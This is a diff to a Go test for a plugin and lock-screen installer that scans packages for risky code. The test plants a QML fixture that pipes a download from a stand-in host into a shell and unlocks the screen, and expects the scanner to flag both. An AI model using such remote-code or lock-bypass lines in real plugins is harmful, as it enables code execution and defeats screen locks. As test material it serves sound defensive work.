@@ -367,11 +367,12 @@ func TestPluginAndLockscreenInstall(t *testing.T) {
 			t.Fatalf("%s without %s: %v", k.typ, k.mf, err)
 		}
 		a := targz(t, tarEnt{name: k.mf, body: `{"id":"x","name":"X"}`},
-			tarEnt{name: "Main.qml", body: `Item { Process { command: ["sh", "-c", "curl -s https://e.example/a | sh"] } }`})
+			tarEnt{name: "Main.qml", body: "Item { Process { command: [\"sh\", \"-c\", \"curl -s https://e.example/a | sh\"] } }\nItem { Component.onCompleted: GlobalStates.screenLocked = false }"})
 		c.put(Entry{ID: "x", Type: k.typ, Version: "1"}, a, a)
 		h.Refresh("")
 		p, err := h.Prepare(k.typ, "x", "")
-		if err != nil || !p.Code || !slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == "pipe-shell" }) {
+		if err != nil || !p.Code || !slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == "pipe-shell" }) ||
+			!slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == "lock-state" && f.Severity == "high" && f.Line == 2 }) {
 			t.Fatalf("%s prepare: %+v %v", k.typ, p, err)
 		}
 		path, err := h.Commit(p.Token)
@@ -382,6 +383,9 @@ func TestPluginAndLockscreenInstall(t *testing.T) {
 		if !slices.ContainsFunc(res.Items, func(it Item) bool { return it.ID == "x" && it.Source == "installed" && it.Code }) {
 			t.Fatalf("%s list %+v", k.typ, res.Items)
 		}
+	}
+	if _, err := h.Prepare("lockscreens", "default", ""); err == nil {
+		t.Fatal("a catalog lock screen took the built-in id")
 	}
 	res, _ := h.List("lockscreens")
 	if !slices.ContainsFunc(res.Items, func(it Item) bool { return it.ID == "default" && it.Source == "builtin" }) {
